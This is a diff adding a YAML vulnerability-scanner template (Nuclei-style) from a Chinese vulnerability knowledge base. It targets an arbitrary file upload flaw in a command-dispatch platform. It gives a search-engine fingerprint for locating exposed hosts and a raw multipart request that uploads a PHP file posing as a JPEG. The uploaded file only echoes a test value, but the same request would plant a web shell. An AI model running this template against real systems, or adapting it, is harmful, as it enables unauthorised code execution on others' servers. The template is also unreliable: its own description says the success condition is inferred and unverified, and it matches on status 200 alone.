@@ -1,0 +1,45 @@
+id: poc-76156d59ffbb39e1e5f5
+info:
+  name: 指挥调度平台event_uploadfile存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/76156d59ffbb39e1e5f50f21f93a356d
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 76156d59ffbb39e1e5f50f21f93a356d
+    fofa: + hunter`web.body="app/structure/departments.php"`
+http:
+- raw:
+  - 'POST /api/client/event/uploadfile.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36
+
+    Connection: close
+
+    Content-Length: 179
+
+    Content-Type: multipart/form-data; boundary=htu3qcyui73l2jtyqwnk
+
+    Accept-Encoding: gzip, deflate
+
+
+    --htu3qcyui73l2jtyqwnk
+
+    Content-Disposition: form-data; name="uploadfile"; filename="stc.php"
+
+    Content-Type: image/jpeg
+
+
+    <?php echo 111*111;?>
+
+    --htu3qcyui73l2jtyqwnk--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
